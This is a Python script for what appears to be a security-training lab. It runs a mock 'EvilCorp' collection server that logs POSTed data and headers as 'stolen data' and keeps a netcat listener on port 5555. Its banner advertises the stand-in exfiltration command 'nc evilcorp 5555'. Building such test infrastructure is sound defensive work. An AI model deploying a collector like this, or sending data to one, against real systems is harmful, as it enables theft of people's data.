#!/usr/bin/env python3
"""
EvilCorp Data Exfiltration Server
Simulates an attacker's command & control server for security training
"""

import http.server
import socketserver
import urllib.parse
import json
import datetime
import os
import threading
import subprocess
import time

class EvilHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.log_request('GET')
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        html_response = f"""
        <html>
        <head><title>EvilCorp Data Collection</title></head>
        <body>
            <h1>🦹 EvilCorp Data Collection Server</h1>
            <p><strong>Status:</strong> Online and ready</p>
            <p><strong>Time:</strong> {datetime.datetime.now()}</p>
            <p><strong>Path:</strong> {self.path}</p>
            <p><strong>Source IP:</strong> {self.client_address[0]}</p>
            <p>Data received successfully!</p>
            <hr>
            <small>Security Training Environment</small>
        </body>
        </html>
        """
        self.wfile.write(html_response.encode())
    
    def do_POST(self):
        self.log_request('POST')
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        # Save stolen data with detailed information
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        source_ip = self.client_address[0]
        path_safe = self.path.replace('/', '_').replace('?', '_')[:50]
        filename = f'/app/stolen_data/http_{timestamp}_{source_ip}_{path_safe}.txt'
        
        try:
            with open(filename, 'w') as f:
                f.write(f'=== EVILCORP DATA EXFILTRATION ===\n')
                f.write(f'Timestamp: {datetime.datetime.now()}\n')
                f.write(f'Source IP: {source_ip}\n')
                f.write(f'HTTP Method: POST\n')
                f.write(f'Path: {self.path}\n')
                f.write(f'User-Agent: {self.headers.get("User-Agent", "Unknown")}\n')
                f.write(f'Content-Type: {self.headers.get("Content-Type", "Unknown")}\n')
                f.write(f'Content-Length: {content_length}\n')
                f.write(f'\n=== HEADERS ===\n')
                for header, value in self.headers.items():
                    f.write(f'{header}: {value}\n')
                f.write(f'\n=== STOLEN DATA ===\n')
                f.write(post_data.decode('utf-8', errors='replace'))
                f.write(f'\n=== END ===\n')
            
            print(f'[💀 HTTP] Stolen data saved: {filename}')
            print(f'[💀 HTTP] Size: {len(post_data)} bytes from {source_ip}')
            
        except Exception as e:
            print(f'[❌ HTTP] Error saving data: {e}')
        
        # Send response to attacker
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        response = {
            'status': 'success',
            'message': 'Data received by EvilCorp',
            'timestamp': datetime.datetime.now().isoformat(),
            'bytes_received': len(post_data)
        }
        self.wfile.write(json.dumps(response).encode())
    
    def do_OPTIONS(self):
        # Handle CORS preflight requests
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_request(self, method):
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_line = f'[{timestamp}] {method} {self.path} from {self.client_address[0]}\n'
        
        try:
            with open('/app/stolen_data/http_access.log', 'a') as f:
                f.write(log_line)
        except:
            pass
        
        print(f'[🌐 HTTP] {log_line.strip()}')

def start_netcat_listener():
    """Start persistent netcat listener that saves all received data"""
    print('[📡 NC] Starting netcat listener on port 5555...')
    
    while True:
        try:
            # Use netcat to listen for connections
            print('[📡 NC] Waiting for connections on port 5555...')
            result = subprocess.run([
                'nc', '-l', '-p', '5555'
            ], capture_output=True, text=True, timeout=60)
            
            if result.stdout.strip():
                timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
                filename = f'/app/stolen_data/netcat_{timestamp}.txt'
                
                with open(filename, 'w') as f:
                    f.write(f'=== EVILCORP NETCAT CAPTURE ===\n')
                    f.write(f'Timestamp: {datetime.datetime.now()}\n')
                    f.write(f'Port: 5555\n')
                    f.write(f'\n=== RECEIVED DATA ===\n')
                    f.write(result.stdout)
                    f.write(f'\n=== END ===\n')
                
                print(f'[💀 NC] Data captured and saved: {filename}')
                print(f'[💀 NC] Content: {result.stdout.strip()[:100]}...')
            
        except subprocess.TimeoutExpired:
            # Timeout is normal, restart listener
            continue
        except Exception as e:
            print(f'[❌ NC] Error: {e}')
            time.sleep(5)  # Wait before retrying

def print_banner():
    """Print EvilCorp startup banner"""
    banner = """
    ███████╗██╗   ██╗██╗██╗      ██████╗ ██████╗ ██████╗ ██████╗ 
    ██╔════╝██║   ██║██║██║     ██╔════╝██╔═══██╗██╔══██╗██╔══██╗
    █████╗  ██║   ██║██║██║     ██║     ██║   ██║██████╔╝██████╔╝
    ██╔══╝  ╚██╗ ██╔╝██║██║     ██║     ██║   ██║██╔══██╗██╔═══╝ 
    ███████╗ ╚████╔╝ ██║███████╗╚██████╗╚██████╔╝██║  ██║██║     
    ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     
    
    🦹 Data Exfiltration & Command Control Server
    🌐 HTTP Server: http://evilcorp-server:8888
    📡 Netcat Listener: nc evilcorp 5555
    💾 Data Storage: /app/stolen_data/
    ⚠️  Security Training Environment Only
    """
    print(banner)

def main():
    print_banner()
    
    # Ensure data directory exists
    os.makedirs('/app/stolen_data', exist_ok=True)
    
    # Start netcat listener in background thread
    nc_thread = threading.Thread(target=start_netcat_listener, daemon=True)
    nc_thread.start()
    
    # Start HTTP server
    print('[🌐 HTTP] Starting HTTP server on port 8888...')
    try:
        with socketserver.TCPServer(('', 8888), EvilHTTPHandler) as httpd:
            print('[💀 EVIL] EvilCorp servers are online and ready!')
            print('[💀 EVIL] Waiting for data exfiltration attempts...')
            httpd.serve_forever()
    except Exception as e:
        print(f'[❌ EVIL] Failed to start HTTP server: {e}')

if __name__ == '__main__':
    main()